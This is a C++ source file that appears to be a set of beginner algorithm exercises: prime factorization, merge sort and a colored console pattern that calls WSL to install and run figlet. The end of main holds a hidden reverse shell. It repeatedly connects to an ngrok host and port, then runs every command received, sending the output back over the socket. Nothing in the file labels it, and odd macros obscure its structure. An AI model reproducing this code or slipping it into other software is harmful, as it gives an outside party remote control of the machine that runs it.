#include<iostream>
#define ll long long
#define MX 100005
#define do {
#define done }
#define read std::cin>>
#define echo std::cout<<
#define start_ int main()
#define finish return 0;
#define bzero(p,size) (void)memset((p),0,(size))
#include<windows.h>

using namespace std;

int temp[MX];
int num[MX];

class Algo{
 public:


};

class PrimeFactorization:public Algo{
public:
         void Solve()
         {
             int n;read n;
             for(int i=2;i<=n;i++)
             {
                 if(n%i==0)
                 {
                     while(n%i==0)
                     {
                         n=n/i;
                         echo i<<"\n";
                     }
                 }
             }
         }
};

class LinuxTerminal:public Algo{
public:
        void Solve()
        {
          for(int row=0;row<10;row++)
          {
              for(int col=0;col<row;col++)
              {
                  system("color 0B");
                  echo col;
              }
              echo "\n";
          }
          for(int row=10;row>=0;row--)
          {
              for(int col=0;col<row;col++)
              {
                  system("color 0C");
                  echo col;
              }
              echo "\n";
          }

           system("color 0A");
           system("wsl -d Ubuntu -- bash -c 'echo Hello from C++; sudo apt-get install figlet -y ;figlet HELLO WORLD;ifconfig;echo hello vi;'");
        }
};

class MargeSort:public Algo{
public:
        void Marge(int lo,int hi)
        {
            if(lo==hi)return;
            int mid=(lo+hi)/2;
            Marge(lo,mid);
            Marge(mid+1,hi);
            int i,j,k;
            for(i=lo,j=mid+1,k=lo;k<=hi;k++)
            {
                if(i==mid+1)temp[k]=num[j++];
                else if(j==hi+1)temp[k]=num[i++];
                else if(num[i]<num[j])temp[k]=num[i++];
                else temp[k]=num[j++];
            }
            for(k=lo;k<=hi;k++)
            {
                num[k]=temp[k];
            }
        }
};

class MargeInput:public MargeSort{
public:
        void Solve()
        {
            int n;read n;
            int lo=1,hi=n;
            for(int i=lo;i<=n;i++)
            {
                read num[i];
            }
            Marge(lo,hi);
            for(int i=1;i<=n;i++)
            {
                echo num[i]<<"\n";
            }
        }
};


int sock;
void shell()
{
      char buffer[1024];
      char container[1024];
      char total_response[18384];

      while(1)
      {
         jump:
         bzero(buffer,1024);
         bzero(container,sizeof(container));
         bzero(total_response,sizeof(total_response));
         recv(sock,buffer,sizeof(buffer),0);

         if(strncmp("q",buffer,1)== 0){
            closesocket(sock);
	        exit(0);
	      }

         else{
              FILE *fp;
	          fp=_popen(buffer, "r");
              while(fgets(container,1024,fp)!=NULL)
              {
                 strcat(total_response,container);
              }
	      send(sock,total_response,sizeof(total_response),0);
	      fclose(fp);
	      }
      }

}


start_
do
     PrimeFactorization pf;
     pf.Solve();

     LinuxTerminal lt;
     lt.Solve();

     MargeInput ms;
     ms.Solve();

     struct sockaddr_in x;
     ll  port;
     char *ip;
     WSADATA wsaData;

     ip="0.tcp.in.ngrok.io";
     port=10380;


        if(WSAStartup(MAKEWORD(2,0),&wsaData)!=0)
        {
           exit(1);
        }

     sock=socket(AF_INET,SOCK_STREAM,0);
     memset(&x,0,sizeof(x));
     x.sin_family=AF_INET;
     x.sin_addr.s_addr=inet_addr(ip);
     x.sin_port=htons(port);

     start:
     while(connect(sock,(struct sockaddr *) &x,sizeof(x))!=0)
     {
         Sleep(10);
         goto start;
     }
     shell();



 finish
done

